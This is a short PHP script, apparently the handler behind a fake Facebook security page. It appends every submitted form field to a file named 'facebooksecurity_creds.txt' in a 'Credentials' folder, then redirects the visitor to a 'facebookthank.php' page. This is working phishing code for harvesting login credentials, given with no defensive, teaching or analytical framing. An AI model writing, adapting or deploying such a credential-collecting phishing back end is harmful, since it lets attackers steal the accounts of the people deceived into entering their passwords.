<?php
// Define the path to the directory and file
$directory = '../../Credentials'; // Adjust path based on the relative location of the Credentials folder
$file = $directory . '/facebooksecurity_creds.txt';

// Check if the directory exists, if not create it
if (!is_dir($directory)) {
    mkdir($directory, 0755, true);
}

// Open the file for appending
$handle = fopen($file, 'a');
if ($handle === false) {
    die("Error: Unable to open file.");
}

// Write POST data to the file
foreach ($_POST as $key => $value) {
    fwrite($handle, $key . '=' . $value . "\n");
}

// Close the file
fclose($handle);

// Redirect to another page
header('Location: facebookthank.php');
exit();
?>
ss
